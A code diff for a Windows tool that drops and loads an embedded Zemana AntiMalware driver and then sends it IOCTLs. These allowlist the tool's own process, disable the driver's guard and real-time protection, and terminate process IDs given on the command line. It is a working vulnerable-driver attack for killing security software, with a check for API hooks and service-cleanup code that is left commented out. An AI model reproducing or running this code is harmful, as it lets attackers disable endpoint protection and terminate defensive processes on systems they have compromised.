@@ -308,44 +308,177 @@ bool StopAndRemove() {
     }
     return true;
 }*/
+
+int MyMarkServiceForDeletion(char *szServiceName)
+{
+    // Attention: If we would completely delete the service registry key of the driver,
+    // we can not install the driver anymore and have to reboot! By using the INF install
+    // method, the driver is copied to "C:\Windows\system32\drivers\DBUtilDrv2.sys". The
+    // function "SetupDiRemoveDevice" does not delete the driver on both Windows 7 and
+    // Windows 10. It also does not remove the service entry on Windows 7. Only on Windows
+    // 10 the service entry is removed by setting the DWORD "DeleteFlag" to 0x00000001.
+    // After the next reboot this will delete the service registry entry. To do a clean
+    // uninstall on Windows 7, we do the same as the system does on Windows 10 and the
+    // service is deleted on the next reboot. The driver files have to be deleted on
+    // both operating systems by DSE-Patcher.
+
+    // create registry service key of driver
+    char szSubKey[MAX_PATH];
+    lstrcpy(szSubKey,"SYSTEM\\CurrentControlSet\\services\\");
+    lstrcat(szSubKey,szServiceName);
+
+    // open registry key
+    HKEY hKey;
+    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,szSubKey,0,KEY_ALL_ACCESS,&hKey) != ERROR_SUCCESS)
+    {
+        return 1;
+    }
+
+    // create "DeleteFlag" with the DWORD value 0x00000001
+    DWORD dwDeleteFlag = 0x00000001;
+    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 6) unsigned long long to unsigned long
+    if(RegSetValueEx(hKey,"DeleteFlag",0,REG_DWORD,(BYTE*)&dwDeleteFlag,sizeof(DWORD)) != ERROR_SUCCESS)
+    {
+        RegCloseKey(hKey);
+        return 2;
+    }
+
+    // close registry key handle
+    RegCloseKey(hKey);
+
+    return 0;
+}
+
+
+
+
+int MyStopAndDeleteService()
+{
+    int rc = 0;
+    SC_HANDLE schSCManager = NULL;
+    SC_HANDLE schService = NULL;
+
+    // get handle to SCM database
+    //lint -e{838} Warning 838: Previously assigned value to variable has not been used
+    schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
+    if(schSCManager == NULL)
+    {
+        rc = 1;
+        goto cleanup;
+    }
+
+    // get handle to service
+    schService = OpenService(schSCManager,zemina,SERVICE_ALL_ACCESS);
+    if(schService == NULL)
+    {
+        // service is not installed
+        rc = 0;
+        goto cleanup;
+    }
+
+    // if we get here the service is already installed, we have to stop and delete it
+
+    // query service status
+    SERVICE_STATUS_PROCESS ssp;
+    DWORD dwBytesNeeded;
+    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
+    if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
+    {
+        rc = 2;
+        goto cleanup;
+    }
+
+    // service is not stopped already and the service can be stopped at all
+    if(ssp.dwCurrentState != SERVICE_STOPPED && ssp.dwControlsAccepted & SERVICE_ACCEPT_STOP)
+    {
+        // service stop is pending
+        if(ssp.dwCurrentState == SERVICE_STOP_PENDING)
+        {
+            // do this as long as the service stop is pending
+            // try 10 times and wait one second in between attempts
+            for(unsigned int i = 0; i < 10; i++)
+            {
+                // query service status
+                //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
+                if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
+                {
+                    rc = 3;
+                    goto cleanup;
+                }
+
+                // check if service is stopped
+                if(ssp.dwCurrentState == SERVICE_STOPPED)
+                {
+                    // leave for loop
+                    break;
+                }
+
+                // wait one seconds before the next try
+                Sleep(1000);
+            }
+        }
+
+        // stop service
+        if(ControlService(schService,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&ssp) == FALSE)
+        {
+            rc = 4;
+            goto cleanup;
+        }
+
+        // do this as long as the service is not stopped
+        // try 10 times and wait one second in between attempts
+        for(unsigned int i = 0; i < 10; i++)
+        {
+            // query service status
+            //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
+            if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
+            {
+                rc = 5;
+                goto cleanup;
+            }
+
+            // check if service is stopped
+            if(ssp.dwCurrentState == SERVICE_STOPPED)
+            {
+                // leave for loop
+                break;
+            }
+
+            // wait one seconds before the next try
+            Sleep(1000);
+        }
+    }
+
+    // We do not check for the 10 second timeout of the for loops above. If the service is not stoppable or
+    // does not stop, because some other handle is open, we should make sure to mark it for deletion. This
+    // way it is deleted on the next system startup.
+
+    cleanup:
+    if(schService != NULL)
+    {
+        // delete service
+        DeleteService(schService);
+        // close service handle
+        CloseServiceHandle(schService);
+    }
+
+    // close service manager handle
+    if(schSCManager != NULL) CloseServiceHandle(schSCManager);
+
+    // mark registry service key for deletion
+    // we do not check the return value, because it may be no service entry present at startup
+    //lint -e{534} Warning 534: Ignoring return value of function
+    //lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
+    MyMarkServiceForDeletion(zemina);
+
+    // delete vulnerable driver
+    // we do not check the return value, because it may be no driver file present at startup
+
+    return rc;
+}
+
+
 int main(int argc, char** argv) {
-
-    ntdll = GetModuleHandleA("ntdll.dll");
-    if (ntdll == NULL) {
-        return false;
-    }
-    std::wstring string_to_convert=GetFullTempPath()+L"\\zemina.sys";
-//setup converter
-    using convert_type = std::codecvt_utf8<wchar_t>;
-    std::wstring_convert<convert_type, wchar_t> converter;
-//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
-    std::string converted_str = converter.to_bytes( string_to_convert );
-
-    std::ofstream wf(converted_str, std::ios::out | std::ios::binary);
-
-    wf.write(driver, 203680);
-    wf.close();
-    /*
-    nPath=L"\\??\\"+GetFullTempPath()+L"\\zemina.sys";
-    char format[100]="sc create %s binpath= %s type=kernel";
-    const char *char_name = converted_str.c_str();
-    char stream[1000];
-    snprintf(stream,100,format,zemina,"C:\\Users\\BLUE_GIGI\\AppData\\Local\\Temp\\zemina.sys");
-    printf("%s\n",stream);
-    //printf("%s",exec(stream).c_str());
-    */
-
-    auto customRtlAdjustPrivilege = (myRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
-    ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
-    BOOLEAN SeLoadDriverWasEnabled;
-    NTSTATUS Status = customRtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
-    if (!NT_SUCCESS(Status)) {
-        printf("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
-        return false;
-    }
-    LoadNTDriver();
-
-
 
     printf("\nChecking hooks\n");
     hookChecker(L"C:\\Windows\\System32\\kernel32.dll", L"kernel32.dll", "CreateFileA");
@@ -353,67 +486,88 @@ int main(int argc, char** argv) {
     hookChecker(L"C:\\Windows\\System32\\kernel32.dll", L"kernel32.dll", "DeviceIoControl");
 
 
+
+    ntdll = GetModuleHandleA("ntdll.dll");
+    if (ntdll == NULL) {
+        return false;
+    }
+    std::wstring string_to_convert=GetFullTempPath()+L"\\zemina.sys";
+
+//setup converter. just for more complicated asm
+    using convert_type = std::codecvt_utf8<wchar_t>;
+    std::wstring_convert<convert_type, wchar_t> converter;
+//use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
+
+    std::string converted_str = converter.to_bytes( string_to_convert );
+    std::ofstream wf(converted_str, std::ios::out | std::ios::binary);
+    wf.write(driver, 203680);
+    wf.close();
+
+    auto customRtlAdjustPrivilege = (myRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+    ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
+    BOOLEAN SeLoadDriverWasEnabled;
+    NTSTATUS Status = customRtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
+    if (!NT_SUCCESS(Status)) {
+        printf("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\n");
+        return 1;
+    }
+    LoadNTDriver();
+
     printf("\nStarting device control\n");
     myDeviceIoControl dynamicIoControl = (myDeviceIoControl) GetProcAddress((HINSTANCE) LoadLibrary("kernel32.dll"),
                                                                             "DeviceIoControl");
-
     HANDLE hDevice = 0;
     int exploit_pid = 0;
     bool success = 0, disable_zam = 0, disable_rt = 0;
     static void *address;
 
-    std::cout << "[-] Retrieving a handle to the zemina device driver" << std::endl;
+    printf("[!] Retrieving zam64 handle [!]\n");
     hDevice = CreateFile("\\\\.\\ZemanaAntiMalware", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL, NULL);
     if (!hDevice) {
-        std::cout << "\t[!] Failed to get a handle to the zemina device driver. Error code: " << ::GetLastError()
-                  << std::endl;
+        printf("[X] Error : %lu [X]",GetLastError());
         return -1;
     }
-    std::cout << "\t[+] zemina AntiMalware HANDLE: 0x" << std::hex << hDevice << std::endl;
+    printf("[!] Zemana AntiMalware HANDLE: 0x%lu [!]\n",hDevice);
 
-    std::cout << "[-] Adding exploit's process to the allowlist" << std::endl;
+    printf("[!] Adding process to the allowlist [!]\n");
     exploit_pid = GetCurrentProcessId();
     if (!exploit_pid) {
-        std::cout << "\t[!] Failed to get exploit's process PID. Error code: " << ::GetLastError() << std::endl;
+        printf("[X] Error code: %lu",GetLastError());
         return -1;
     }
-    std::cout << "\t[+] Exploit process' PID: " << exploit_pid << std::endl;
 
 
     success = dynamicIoControl(hDevice, 0x80002010, &exploit_pid, sizeof(exploit_pid), NULL, 0, NULL, NULL);
     if (!success) {
-        std::cout << "\t[!] Failed to add exploit's process to the allowlist. Error code: " << ::GetLastError()
-                  << std::endl;
+        printf("[X] Failed to add exploit's process to the allowlist. Error code: %lu",GetLastError());
         return -1;
     }
-    std::cout << "\t[+] Exploit process' added to the allowlist" << std::endl;
 
-    std::cout << "[-] Disabling ZAM Guard and Real-Time Protection" << std::endl;
+    printf("[!] Disabling ZAM Guard and Real-Time Protection [!]\n");
     disable_zam = DeviceIoControl(hDevice, 0x80002064, NULL, sizeof(exploit_pid), NULL, 0, NULL, NULL);
     disable_rt = DeviceIoControl(hDevice, 0x80002090, NULL, sizeof(exploit_pid), NULL, 0, NULL, NULL);
     if (!disable_zam || !disable_rt) {
-        std::cout << "\t[!] Failed to disable ZAM Guard or Real-Time Protection" << std::endl;
+        printf("[!] Failed to disable ZAM Guard or Real-Time Protection [!]");
     }
-    std::cout << "\t[+] Disabled ZAM Guard and Real-Time Protection" << std::endl;
 
-    std::cout << "\t[+] Terminating processes \n";
+    printf("[!] Terminating processes [!]\n");
 
 
     for(int i=1;i<argc;i++)
     {
         int pid = atoi(argv[i]);
         if (!terminate_process(hDevice, pid)) {
-            std::cout << "\t[+] Unable to terminate" << std::endl;
+            printf("[X] Unable to terminate\n [X]");
         }
         else
-            printf("\t[+] %d terminated\n",pid);
+            printf("[O] %d terminated\n [O]",pid);
 
     }
 
-    std::cout << "\t[+] Have fun" << std::endl;
+    printf("[O] Have fun [O]");
 
-    MyStopAndDeleteService();
+    //MyStopAndDeleteService();
 
 
 }
